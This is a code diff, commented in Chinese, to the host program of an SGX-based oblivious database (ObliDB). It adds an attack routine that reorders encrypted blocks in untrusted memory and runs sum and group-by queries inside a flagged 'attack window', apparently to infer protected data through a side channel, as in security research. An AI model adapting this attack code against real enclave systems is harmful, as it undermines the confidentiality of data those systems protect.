@@ -108,6 +108,9 @@ uint8_t* attestation_msg_samples[] =
 oblidbextraio::StorageEngine* storageengine = nullptr;
 unsigned char gkey[L_SGX_AESGCM_KEY_SIZE]={0};  /* 用来保存秘钥的 */
 
+
+attacker::AttackWindow atkw(false);
+
 // query 对结果表的处理 + 一个回调 用户自行处置
 
 void
@@ -450,6 +453,10 @@ ocall_read_block(
     int structureId, int index, int blockSize, void *buffer)
 {
 	// std::printf("id is: %d\n", structureId);
+	if(structureId<0){
+		std::printf("invalid tableid: %d\n", structureId);
+		exit(-1);
+	}
 
 	//read in to buffer
 	if(blockSize == 0){
@@ -560,20 +567,25 @@ void ocall_respond( uint8_t* message, size_t message_size, uint8_t* gcm_mac){
 /**
  * 返回表的 schema 是没有给到外面的
  */
-void newStructureinmemory(int newId, Obliv_Type type, int size)
+void newStructureinmemory(int newId, Obliv_Type type, int rownum)
 {
-    // printf("app: %d initializing structure type %d of capacity %d blocks\n", newId, type, size);
+	// printf("app: %d initializing structure type %d of capacity %d blocks\n", newId, type, size);
     int encBlockSize = getEncBlockSize(type);
-    oblivStructureSizes[newId] = size;
+    oblivStructureSizes[newId] = rownum;
     oblivStructureTypes[newId] = type;
-    long val = (long)encBlockSize*size; /* malloc memory in 不可信内存 */
+    long val = (long)encBlockSize*rownum; /* malloc memory in 不可信内存 */
     oblivStructures[newId] = (uint8_t*)malloc(val);
     if(!oblivStructures[newId]) {
         printf("failed to allocate space (%ld bytes) for structure\n", val);
         fflush(stdout);
     }
 
-    return;
+	if(atkw.GetFlag()){
+		if(rownum != 1){
+			atkw.SetHitFlag(true);
+		}
+	}
+	return;
 }
 
 /** 
@@ -647,12 +659,12 @@ ocall_newStructure(
     {
     case RET:
     case TEMP:
-		printf("Create new memory table:%d,row num:%d\n", newId, size);
+		// printf("Create new memory table:%d,row num:%d\n", newId, size);
         newStructureinmemory(newId, type, size);
 		oblivStructureStorageTypes[newId] = MEMORY;
         break;
     default:
-		printf("Create new disk table:%d,row num:%d\n", newId, size);
+		// printf("Create new disk table:%d,row num:%d\n", newId, size);
         newStructureinperist(newId, type, size);
 		oblivStructureStorageTypes[newId] = DISK;
         break;
@@ -729,16 +741,18 @@ GetNextIdOutSgx() {
 }
 
 void
-QueryFinishCallback(sgx_enclave_id_t enclave_id, int status)
+QueryFinishCallback(sgx_enclave_id_t enclave_id, int status, int tableid)
 {
 	// oblivStructureStorageTypes[newId] = MEMORY;
 	// for(i=0;i<NUM_STRUCTURES;++i){
 	// 	if(oblivStructureStorageTypes[i]==MEMORY) { break; }
 	// }
 	// 在搞一个内存表的时候，这个就不适用了
-	int retid = GetNextIdOutSgx()-1;
-
-	// printf("ret table is %d\n", i);
+	int retid = tableid;
+	if(tableid<0){
+		retid = GetNextIdOutSgx() - 1;
+	}
+	// printf("ret table is %d\n", retid);
 	int rownum = oblivStructureSizes[retid];
 	uint8_t* addr = oblivStructures[retid];
 	Obliv_Type type = static_cast<Obliv_Type>(oblivStructureTypes[retid]);
@@ -748,11 +762,16 @@ QueryFinishCallback(sgx_enclave_id_t enclave_id, int status)
 
 	// for example
 	// print
+#ifndef AGGR_DEBUG
+	NewQueryBegin(enclave_id, (int*)&status);
+#endif
 	for(int j=0;j<rownum;++j){
 		decryptOneBlock(
 			enclave_id, (int*)&status, (Encrypted_Linear_Scan_Block*)(addr + j*ATK_BLOCK_SIZE), retid);
 	}
-
+#ifndef AGGR_DEBUG
+	NewQueryEnd(enclave_id, (int*)&status);
+#endif
 	// to disk
 
 	return;
@@ -762,9 +781,9 @@ void
 QueryFinish(
 	char* tbname, 
 	sgx_enclave_id_t enclave_id, int status, 
-	void (*QueryCallback)(sgx_enclave_id_t, int))
+	void (*QueryCallback)(sgx_enclave_id_t, int, int), int tableid)
 {
-	QueryCallback(enclave_id, status);
+	QueryCallback(enclave_id, status, tableid);
 	return;
 }
 
@@ -777,6 +796,7 @@ QueryFinish(
 void
 SelectTable(sgx_enclave_id_t enclave_id, int status)
 {
+	return;
 	// CrackTables(enclave_id, status);
 	// return;
 	// oblidbextraio::DBTable* dbtables[NUM_STRUCTURES] = {nullptr};
@@ -814,7 +834,7 @@ SelectTable(sgx_enclave_id_t enclave_id, int status)
     //     name, 3, cond, 0, -1, 1, 0); //continuous
 
 	// 结果表已经写完了，select后面直接带一个函数算了，模拟一下回调
-	QueryFinish(name, enclave_id, status, QueryFinishCallback);
+	QueryFinish(name, enclave_id, status, QueryFinishCallback, -1);
 
     printf("Query over!\n");
 	return;
@@ -1003,6 +1023,10 @@ PersistExample(sgx_enclave_id_t enclave_id, int status)
 	return;
 }
 
+/**
+ * continue select * 选出来的结果可能是有问题的，这个结果表可能会与原结果表不一致
+ * 所以我要再次去 select 的是结果表
+ */
 void 
 PureContinueAT(sgx_enclave_id_t enclave_id, int status)
 {
@@ -1017,7 +1041,6 @@ PureContinueAT(sgx_enclave_id_t enclave_id, int status)
 		if(!tbname.compare(tar)){
 			break;
 		}
-		// std::cout << tbname << std::endl;
 	}
 
 	int tableid = i;
@@ -1025,30 +1048,12 @@ PureContinueAT(sgx_enclave_id_t enclave_id, int status)
 	int orgrownum = targettable->TableSize();
 	Schema* _schame = targettable->GetSchema();
 
-	// std::cout << "name is: " << tbname << std::endl;
-	// 总共有几个 88
 	char* name = const_cast<char *>(tbname.c_str());
 	int low = 10, high = 13, lower = 9, higher = 14;
 
-	/**
-	 * 1. 首先，有一个持久性的数据库表，select * 操作可以得到一个内存数据库表全部
-	 * 2. 根据这个完成的内存数据库表（return表）reorderd之后再去 sgx 中创建对应的表
-	 * 3. 这样，就有了原表与乱序表，就可以分别对他们做 select 的聚合操作
-	 */
 	Obliv_Type _type = static_cast<Obliv_Type>(oblivStructureTypes[tableid]);
 	size_t ATK_BLOCK_SIZE = getEncBlockSize(_type);
 	char tmparray[ATK_BLOCK_SIZE];
-
-	// Condition cond_1;
-	// cond_1.numClauses = 0;
-	// cond_1.nextCondition = NULL;
-	// selectRows(
-	// 	enclave_id, (int*)&status, name, 3, cond_1, 0, -1, 1, 0); //select *
-	// QueryFinish(name, enclave_id, status, QueryFinishCallback);
-	// return;
-
-	// int nextid = GetNextIdOutSgx();
-	// std::printf("next id is %d\n", nextid);
 
 	// 查询条件对两张表都是一致的
     Condition cond;
@@ -1061,9 +1066,21 @@ PureContinueAT(sgx_enclave_id_t enclave_id, int status)
     cond.values[1] = (uint8_t*)&higher;
     cond.nextCondition = NULL;
 
+	Condition cond_1;
+	cond_1.numClauses = 0;
+	cond_1.nextCondition = NULL;
+
+    attacker::OblidbContinueAttackTest test(low, high);
+    size_t R = test.Size();
+    size_t STEP = R;
+
+	attacker::cursor _cursor;
+	_cursor.begin = 0;
+	_cursor.whichloop = 0;
+
+    // 1 号表，乱序表
+	char* tableName = "TempReorder";
 	int tempreorserid = -1;
-	// 创建 reorder table，这应该是一个内存表
-    char* tableName = "TempReorder";
     createTable(
         enclave_id, 
         (int*)&status, 
@@ -1074,33 +1091,58 @@ PureContinueAT(sgx_enclave_id_t enclave_id, int status)
         orgrownum,
         &tempreorserid
     );
-
-	// selectRows(enclave_id, (int*)&status, name, 3, cond, 1, -1, 1, 0); //select range
-	// QueryFinish(name, enclave_id, status, QueryFinishCallback);
-	// deleteTable(enclave_id, (int*)&status, "ReturnTable");
-	// return;
-
-	// 获取 重新排序 后的内存表的地址
 	uint8_t* TempReorderTable = (uint8_t*)oblivStructures[tempreorserid];
-	/**
-	 * tableid=1 的表重排序后写到 tableid=2 的表中
-	 * TODO 后面再去抽象，先把功能怼出来的说
-	 */
-	// attacker::OblidbContinueAttack atk(); 
-	// atk.RollCheck();
 
-    attacker::OblidbContinueAttackTest test(low, high);
-    size_t R = test.Size();
-    size_t STEP = R;
+    // 2 号表，过程表
+	char* processTablename = "TempProcessTable";
+	int processtableid = -1;
+	createTable(
+		enclave_id, 
+		(int*)&status, 
+		_schame,
+		processTablename, 
+		strlen(processTablename), 
+		TYPE_LINEAR_SCAN, 
+		R,
+		&processtableid
+	);
+    uint8_t* TempProcessTable = (uint8_t*)oblivStructures[processtableid];
 
-	attacker::cursor _cursor;
-	_cursor.begin = 0;
-	_cursor.whichloop = 0;
+    // 3 号表，结果表 两行一列
+    Schema resschem;
+	resschem.numFields = 2;
+	resschem.fieldOffsets[0] = 0;
+	resschem.fieldSizes[0] = 1;
+	resschem.fieldTypes[0] = CHAR;
+	resschem.fieldOffsets[1] = 1;
+	resschem.fieldSizes[1] = 4;
+	resschem.fieldTypes[1] = INTEGER;
 
+	char* resulttablename = "TempResultTable";
+	int resultTableid = -1;
+	createTable(
+		enclave_id, 
+		(int*)&status, 
+		&resschem,
+		resulttablename, 
+		strlen(resulttablename), 
+		TYPE_LINEAR_SCAN, 
+		2,
+		&resultTableid
+	);
+    uint8_t* Tempresulttable = (uint8_t*)oblivStructures[resultTableid];
+
+    selectRows(enclave_id, (int*)&status, name, 3, cond, 1, -1, 1, 0);  // 1 means sum, 即选定的聚合条件是 sum
+    int rettableid = GetNextIdOutSgx() - 1;
+    memcpy((void*)Tempresulttable, (void*)oblivStructures[rettableid], ATK_BLOCK_SIZE);
+    // decryptOneBlock(enclave_id, (int*)&status, (Encrypted_Linear_Scan_Block*)(Tempresulttable), rettableid);
+	deleteTable(enclave_id, (int*)&status, "ReturnTable");
+    // return;
+    //
+    //
 	// printf("start attack!\n");
 	while(STEP){
 		uint64_t begin;
-		// _Rollback(this, _cursor, _cursor.whichloop);
 		for(int j=_cursor.whichloop;j<orgrownum;++j)
 		{
 			// firstly, reorder table
@@ -1142,20 +1184,67 @@ PureContinueAT(sgx_enclave_id_t enclave_id, int status)
 				}
 			}
 
-			// printf("end reorder: %d\n", j);
-			// second, do select
-			// printf("begin select row: %d\n", j);
 			// 聚合操作已经不涉及所谓的 continue 算法了我日
-			selectRows(enclave_id, (int*)&status, tableName, 3, cond, 4, -1, 1, 0); //select range
-			// printf("end select row: %d\n", j);
-			QueryFinish(tableName, enclave_id, status, QueryFinishCallback);
-			deleteTable(enclave_id, (int*)&status, "ReturnTable");
-		}
+			// 所以这里对重排序表应该做 select * 的操作，而不是聚合操作，聚合应该是下一步的操作
+			// printf("\n");
+			// printf("select to get process table\n");
+			selectRows(enclave_id, (int*)&status, tableName, -1, cond, -1, -1, 1, 0); //select range
 
-		printf("Step:%d, Begin:%d, Loop index:%d\n", STEP, _cursor.begin, _cursor.whichloop);
+            // QueryFinish(processTablename, enclave_id, status, QueryFinishCallback, -1);
+            // deleteTable(enclave_id, (int*)&status, "ReturnTable");
+            // return;
+
+			// 获取返回表 id
+			int rettableid = GetNextIdOutSgx() - 1;
+			uint8_t* rettable = (uint8_t*)oblivStructures[rettableid];
+			// printf("end select row: %d\n", j);
+			// QueryFinish(tableName, enclave_id, status, QueryFinishCallback, -1);
+			// printf("ret id:%d,process id:%d\n", rettableid, processtableid);
+			/* return table 到 临时表的 copy, 然后再聚合对应的表，俩都是内存表 */
+			for(int rr=0;rr<R;++rr){
+				void* dst;
+				void* src;
+				src = reinterpret_cast<void *>((rettable + rr*ATK_BLOCK_SIZE));
+				dst = reinterpret_cast<void *>((TempProcessTable + rr*ATK_BLOCK_SIZE));
+				memcpy(dst, src, ATK_BLOCK_SIZE);
+				// decryptOneBlock(enclave_id, (int*)&status, (Encrypted_Linear_Scan_Block*)(char *)dst, 0);
+			}
+			deleteTable(enclave_id, (int*)&status, "ReturnTable");
+
+            /**
+             * 聚合
+             * 结果表一定是 3 号表
+             * 对 3 号表的聚合的结果 A 以及对 1 号表 tableName 的聚合操作结果 B 就已经可以观察到差异了，这个结果就已经有差异了
+             * 把这两个结果怼到 一张表，做一个 group 操作，就应该能够知道 这两个结果是否是一致的了
+             * 注册聚合函数
+             */
+			selectRows(enclave_id, (int*)&status, processTablename, 3, cond, 1, -1, 1, 0);  // 1 means sum
+			rettableid = GetNextIdOutSgx() - 1;
+			memcpy((void*)(Tempresulttable + ATK_BLOCK_SIZE), (void*)oblivStructures[rettableid], ATK_BLOCK_SIZE);
+			// for(int iii=0;iii<2;++iii){
+			// 	decryptOneBlock(
+			// 		enclave_id, (int*)&status, 
+			// 		(Encrypted_Linear_Scan_Block*)(Tempresulttable + iii*ATK_BLOCK_SIZE), rettableid);
+			// }
+			std::printf("attack start\n");
+			deleteTable(enclave_id, (int*)&status, "ReturnTable");
+			// bool attackflag = false;
+
+			// only 单线程，在 attackflag = true 的窗口中，进行 select
+			atkw.SetFlag(true);
+			selectRows(enclave_id, (int*)&status, resulttablename, 1, cond_1, 0, 1, 4, 0);  // 1 means sum
+			// QueryFinish(resulttablename, enclave_id, status, QueryFinishCallback, -1);
+			deleteTable(enclave_id, (int*)&status, "ReturnTable");  // group by 的结果不一样了
+			atkw.SetFlag(false);
+			if(atkw.GetHitFlag()){
+				_cursor.whichloop = j;
+				atkw.SetHitFlag(false);
+				break;
+			}
+		}
+		printf("Step:%d, Loop index:%d\n", STEP, _cursor.whichloop);
 		STEP /= 2;
 	}
-
 	return;
 }
 
@@ -4862,7 +4951,7 @@ int main(int argc, char* argv[])
         //real world query tests
         //PICK EXPERIMENT TO RUN HERE
 		// OpenDB1thTable(enclave_id, status);
-		// SelectTable(enclave_id, status);
+		SelectTable(enclave_id, status);
 		// PersistExample(enclave_id, status);
 		PureContinueAT(enclave_id, status);
 		// DBContinueAT(enclave_id, status);
